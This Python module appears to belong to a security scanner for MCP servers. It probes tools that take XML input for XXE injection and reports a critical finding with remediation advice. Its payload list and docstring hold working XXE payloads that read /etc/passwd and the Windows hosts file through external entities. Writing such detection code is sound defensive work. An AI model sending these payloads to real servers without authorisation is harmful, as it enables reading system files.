"""
XML External Entity (XXE) Injection Check

MCP-INJ-007  XXE Injection via Tool XML Parameters

  Tools that accept XML input and parse it server-side are vulnerable to
  XXE if the XML parser has external entity processing enabled (the insecure
  default for many parsers). An attacker can:

    • Read arbitrary files: <!ENTITY xxe SYSTEM "file:///etc/passwd">
    • Perform SSRF via http:// entities
    • Cause DoS via recursive entity expansion ("billion laughs")

  Detection strategy:
    1. Identify tools with parameters whose names or types suggest XML input
       (xml, content, body, data, payload, document, input — combined with
       schema type: string and no format constraint).
    2. Send an XML payload with an internal entity that expands to a known
       marker string. If the marker appears in the response, the parser
       evaluated the entity (XXE confirmed).
    3. Also send a file:// entity payload and check for system file content.

  We deliberately avoid billion-laughs payloads — they can crash the server.
"""

import sys
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))
from models import Vulnerability, Severity, MCPServer
from utils import http_post
from utils.logger import get_logger

logger = get_logger("xxe")

# Parameter names that commonly carry XML content
_XML_PARAM_NAMES = {
    "xml", "content", "body", "data", "payload", "document",
    "input", "text", "source", "raw", "markup", "soap", "request",
}

# Marker we embed — if it echoes back the parser evaluated the entity
_XXE_MARKER = "XXE_SCANNER_MARKER_7f3a9c"

# Payloads: (label, xml_string, confirmation_substring)
_XXE_PAYLOADS = [
    (
        "internal entity expansion",
        f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "{_XXE_MARKER}">]>'
        f"<test>&xxe;</test>",
        _XXE_MARKER,
    ),
    (
        "file:// entity read",
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<test>&xxe;</test>",
        "root:",   # /etc/passwd content
    ),
    (
        "file:// Windows entity read",
        '<?xml version="1.0"?><!DOCTYPE test ['
        '<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>'
        "<test>&xxe;</test>",
        "localhost",
    ),
]


def _xml_params_for_tool(server: MCPServer, tool_name: str) -> list[str]:
    """Return parameter names likely to carry XML for the given tool."""
    schemas = getattr(server, "tool_schemas", {}) or {}
    schema = schemas.get(tool_name, {})
    props = (
        schema.get("properties")
        or schema.get("inputSchema", {}).get("properties")
        or {}
    )
    candidates = []
    for param, defn in props.items():
        if param.lower() in _XML_PARAM_NAMES:
            candidates.append(param)
        elif isinstance(defn, dict) and defn.get("type") == "string":
            # No format hint — could be XML; include as a fallback
            if param.lower() in ("content", "body", "data", "input", "text", "raw"):
                candidates.append(param)
    return candidates


async def check_xxe(server: MCPServer) -> Optional[Vulnerability]:
    """Check for XXE vulnerabilities in tools that accept XML input."""
    if not server.tools:
        return None

    for tool in server.tools:
        xml_params = _xml_params_for_tool(server, tool)

        # Heuristic fallback: tool name itself suggests XML processing
        if not xml_params:
            if any(kw in tool.lower() for kw in ("xml", "parse", "soap", "xslt", "transform")):
                xml_params = ["xml", "content", "body", "data"]
            else:
                continue

        for label, payload, confirmation in _XXE_PAYLOADS:
            args = {p: payload for p in xml_params}
            request = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {"name": tool, "arguments": args},
                "id": 1,
            }
            try:
                _status, body, _headers = await http_post(server.url, request, timeout=6.0)
                if confirmation in body:
                    return Vulnerability.create(
                        id="MCP-INJ-007",
                        title=f"XML External Entity (XXE) Injection ({label})",
                        description=(
                            f"The tool '{tool}' on {server.url} is vulnerable to XXE "
                            f"injection via {label}. The XML parser evaluated an external "
                            "entity reference, allowing arbitrary file reads and potential "
                            "SSRF. Any data accessible to the server process can be exfiltrated."
                        ),
                        severity=Severity.CRITICAL,
                        category="Injection",
                        remediation=(
                            "Fix XXE vulnerabilities:\n"
                            "- Disable external entity processing in the XML parser\n"
                            "  Python lxml: use resolve_entities=False\n"
                            "  Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
                            "  .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"
                            "- Use a data format that doesn't support entity expansion (JSON)\n"
                            "- If XML is required, validate against a strict schema before parsing\n"
                            "- Never pass raw user-controlled XML to the parser"
                        ),
                        evidence=[
                            f"Vulnerable tool: {tool}",
                            f"Attack type: {label}",
                            f"Confirmation: entity output found in response",
                        ],
                        affected_component=f"Tool: {tool}",
                        cwe_id="CWE-611",
                        cvss_score=9.1,
                    )
            except (ConnectionError, TimeoutError) as e:
                logger.debug(f"XXE probe error for {tool}: {e}")
                continue
            except Exception as e:
                logger.debug(f"Unexpected error probing {tool} for XXE: {e}")
                continue

    return None
